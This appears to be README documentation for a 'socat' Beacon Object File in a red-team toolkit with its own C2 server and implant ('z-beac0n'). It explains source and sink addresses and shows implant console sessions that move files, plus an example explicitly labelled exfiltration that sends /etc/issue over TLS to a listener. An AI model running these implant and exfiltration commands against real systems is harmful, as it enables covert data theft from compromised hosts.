
# socat BOF

BOF allows to establish arbitrary TCP or TLS connections between two machines to conduct file transfers. Transfers are conducted in an out-of-band manner meaning that separate connection is established for a duration of the transfer. Connection details are specified via `<src-address>` or `<sink-address>` arguments depending on the desired direction of the data flow (by convention connections are unidirectional and data flows from source to sink).

BOF is inspired by the original CLI version of the tool available at `http://www.dest-unreach.org/socat/`.

BOF source code: [socat code](../src/socat.zig)

## Options

**BOF supports following invocation syntax:** 

    socat <str:src-address> <str:sink-address> [[int:BUF_LEN str:BUF_ADDRESS_1] ... [int:BUF_LEN str:BUF_ADDRESS_N]]

**Address specification:**

`<str:src-address>` - an address that acts as a data source

`<str:sink-address>` - an address that acts as a data sink

**Currently supported address types:**

`OPEN:<filename>` - opens existing file in a read-only mode. Only allowed as `<src-address>`.

`CREATE:<filename>` - creates (if file already exists it will be overwritten) a new file. Allowed only as `<sink-address>`.

`TCP:<host:port>` - establish TCP connection to `host` at `port`.

`TLS:<host:ssl-enabled-port>[:opt1,...,optN]` - establish TLS connection to `host` at `port`.



`[[int:BUF_LEN str:BUF_ADDRESS_1] ... [int:BUF_LEN str:BUF_ADDRESS_N]]` - optional arguments

## Use cases

### Downloading large file over TCP connection

Preparing and serving file:

```
$ dd if=/dev/urandom of=largeFile bs=100M count=3
3+0 records in
3+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 1.4956 s, 210 MB/s

$ ncat -nlvp 2222 < largeFile 
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:2222
Ncat: Listening on 0.0.0.0:2222
```

Downloading the file:
```
Launching `z-beac0n C2 service` on `terminal 2`:

    $ cd examples/implant/
    $ python z-beac0n-C2.py

Launching `z-beac0n implant` on `terminal 3`:

    $ ./zig-out/bin/z-beac0n_lin_x64.elf
```

Running `z-beac0n console` and executing `socat` BOF on `terminal 4`:

```
$ python z-beac0n-console.py

z-beac0n> bof info socat
Name: socat
Description: Concatenate and redirect sockets
Author: Z-Labs
Operating System: cross-platform
[ ... removed for brevity ... ]
Usage: 
socat <src-address> <sink-address> [int:BUF_LEN str:BUF_MEMORY_ADDRESS]
[ ... ]

z-beac0n> bof exec-thread Dbepb4bB socat --argv 'TCP:localhost:2222 CREATE:BigFile'
z-beac0n> bof exec-inline Dbepb4bB ls --argv '.'
z-beac0n> implant last Dbepb4bB

Implant ID: Dbepb4bB
Last task ID: 7539d4bc063e9b40

INPUT: 

bof:ls ejou

OUTPUT: 

...
-rw-rw-r--	user user	314572800 2026-10-09 14:29:49	BigFile
...

```

### Exfiltration of file content over TLS channel

Running socat (original) as listener at `terminal 1`:

    terminal_1$ socat OPENSSL-LISTEN:2222,reuseaddr,cert=cert.pem,key=key.pem,verify=0 -

Running `socat` bof using our CLI `bof` [utility](../../examples/cli4bofs/) for sending content of the `/etc/issue` file over TLS tunnel with `cacert.pem` certificate:

    terminal_2$ bof -c BOF-Z-Labs.yaml exec socat.elf.x64.o OPEN:/etc/issue TLS:localhost:2222:cacert file:cacert.pem

Observed output on `terminal 1`:
```
terminal_1$ socat OPENSSL-LISTEN:2222,reuseaddr,cert=cert.pem,key=key.pem,verify=0 -
Debian GNU/Linux 13 \n \l
```

### Fetching file content over TLS connection
This time file with be downloaded from within [z-beac0n implant](../../examples/implant/).

Serving content of the example file on `terminal 1`:

```
$ ncat --ssl -nlvp 8888 --ssl-cert cert.pem --ssl-key key.pem < /etc/issue 
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:8888
Ncat: Listening on 0.0.0.0:8888
```

Launching `z-beac0n C2 service` on `terminal 2`:

    $ cd examples/implant/
    $ python z-beac0n-C2.py

Launching `z-beac0n implant` on `terminal 3`:

    $ ./zig-out/bin/z-beac0n_lin_x64.elf

Running `z-beac0n console` and executing `socat` BOF on `terminal 4`:
```
$ python z-beac0n-console.py
z-beac0n> bof exec-inline Dbepb4bB socat --argv 'TLS:localhost:8888:cacert CREATE:/tmp/dkleSDy file=./cacert.pem'
```

## Examples
